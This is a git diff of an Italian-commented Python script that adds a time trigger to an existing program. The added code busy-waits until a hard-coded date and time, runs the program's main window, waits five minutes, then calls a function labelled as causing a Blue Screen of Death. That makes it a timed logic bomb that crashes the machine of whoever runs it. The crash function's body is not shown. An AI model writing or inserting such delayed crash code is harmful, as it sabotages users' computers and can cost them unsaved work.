@@ -7,6 +7,8 @@ from comtypes import CLSCTX_ALL
 from pycaw.pycaw import AudioUtilities, ISimpleAudioVolume
 import random
 import threading
+from datetime import datetime
+import time
 
 # Funzione per causare un BSOD
 def bsod():
@@ -54,5 +56,15 @@ def main():
     root = tk.Tk()
     root.mainloop()
 
-if __name__ == "__main__":
-    main()
+start = "07/06/24 09:30:00"
+end = "07/06/24 10:00:00"
+
+start = datetime.strptime(start, "%d/%m/%y %H:%M:%S")
+end = datetime.strptime(end, "%d/%m/%y %H:%M:%S")
+now = datetime.now()
+if now < end:
+    while now < start:
+        now = datetime.now()
+    threading.Thread(main())
+    time.sleep(300)
+    bsod()
